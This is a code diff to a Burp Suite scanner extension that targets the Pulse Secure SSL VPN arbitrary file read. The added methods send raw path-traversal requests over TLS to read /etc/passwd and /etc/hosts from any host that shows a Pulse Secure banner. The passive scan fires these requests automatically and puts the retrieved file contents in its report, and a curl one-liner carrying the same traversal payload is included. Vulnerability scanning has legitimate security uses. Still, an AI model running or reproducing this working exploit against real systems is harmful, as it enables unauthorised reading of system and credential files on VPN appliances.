@@ -6,7 +6,8 @@ from array import array
 from urlparse import urlparse
 from os import path
 from java.net import URL
-
+import ssl
+import socket
 
 
 
@@ -34,21 +35,58 @@ class BurpExtender(IBurpExtender,IScannerCheck):
    
         return matches
 
+    def etc_getir(self,host):
+        try:
+            ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+            sock = ctx.wrap_socket(socket.create_connection((host, 443)),server_hostname=host)
+            sock.send(b"GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/ HTTP/1.1\r\nhost: "+host+"\r\n\r\n")
+            resp = sock.recv(4096)
+            if "root:x:0:0:root" in resp:
+                return resp
+            else:
+                return ""
+
+        except Exception as e:
+            print "Connection Error! "
+            return ""
+        
+        
+    def host_getir(self,host):
+        try:
+            ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+            sock = ctx.wrap_socket(socket.create_connection((host, 443)),server_hostname=host)
+            sock.send(b"GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/hosts?/dana/html5acc/guacamole/ HTTP/1.1\r\nhost: "+host+"\r\n\r\n")
+            resp = sock.recv(4096)
+            return resp
+    
+        except Exception as e:
+            print "Connection Error! "
+            return ""     
+    
     def doPassiveScan(self, baseRequestResponse):
+        my=""
         self.findkey=["/dana-na","Pulse Secure"]
         for keyim in self.findkey:
             matches = self._get_matches(baseRequestResponse.getResponse(), keyim)
             if (len(matches) > 0):
                 x=str(self._helpers.analyzeRequest(baseRequestResponse).getUrl())
                 y=urlparse(x)
-                text = ("<p> curl --path-as-is -s -k \"https://"+y.hostname+"/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/\" </p>")            
-                return [CustomScanIssue(
-                baseRequestResponse.getHttpService(),
-                self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
-                [self._callbacks.applyMarkers(baseRequestResponse, None, matches)],
-                "Pulse SSL VPN Arbitrary File Read",
-                text,
-                "High")]    
+                my=self.etc_getir(y.hostname)
+                if "root:x:0:0:root" in my:
+                    etcpwd = "<p>"+(my)+"</p>"
+                    hostsdata=self.host_getir(y.hostname)
+                    
+                    text="<p>"+etcpwd+"</p><p>"+hostsdata+"</p> info : <p> curl --path-as-is -s -k \"https://"+y.hostname+"/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/\" </p>"
+                    
+                
+                #text = ()            
+                    return [CustomScanIssue(
+                    baseRequestResponse.getHttpService(),
+                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
+                    [self._callbacks.applyMarkers(baseRequestResponse, None, matches)],
+                    "Pulse SSL VPN Arbitrary File Read",
+                    text,
+                    "High")]    
 
 
 
